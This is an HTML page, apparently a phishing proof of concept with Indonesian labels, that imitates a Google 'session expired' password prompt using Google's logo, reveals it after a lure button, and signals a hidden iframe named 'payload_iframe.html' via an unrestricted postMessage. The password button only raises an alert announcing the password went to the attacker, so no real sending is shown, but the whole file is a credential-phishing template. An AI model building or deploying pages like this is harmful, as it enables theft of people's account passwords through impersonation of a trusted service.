<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Redirect</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background: #fff;
        }

        .box {
            width: 100%;
            max-width: 400px;
            text-align: center;
            padding: 20px;
        }

        /* FORM LOGIN AWALNYA DISEMBUNYIKAN */
        #phishing-form {
            display: none;
            border: 1px solid #dadce0;
            padding: 30px;
            border-radius: 8px;
        }

        img {
            width: 75px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 22px;
            font-weight: 400;
            margin-bottom: 20px;
        }

        input {
            width: 90%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }

        .btn-blue {
            width: 95%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        /* TOMBOL PEMANCING AWAL */
        #init-btn {
            padding: 15px 30px;
            font-size: 18px;
            background: #34a853;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>

<body>

    <div class="box">
        <button id="init-btn" onclick="triggerEverything()">Klik untuk Login ke Google</button>

        <div id="phishing-form">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
            <h1>Verifikasi Akun</h1>
            <p>Sesi Anda habis, masukkan password untuk verifikasi.</p>
            <input type="password" id="target_pwd" placeholder="Password Google">
            <button class="btn-blue" onclick="alert('Password terkirim ke attacker!')">Verifikasi</button>
        </div>
    </div>

    <iframe id="spoof_frame" sandbox="allow-scripts allow-top-navigation allow-same-origin" src="payload_iframe.html"
        style="display:none;"></iframe>

    <script>
        function triggerEverything() {
            document.getElementById('init-btn').style.display = 'none';
            document.getElementById('phishing-form').style.display = 'block';
            const frame = document.getElementById('spoof_frame');
            frame.contentWindow.postMessage('go', '*');
        }
    </script>
</body>

</html>
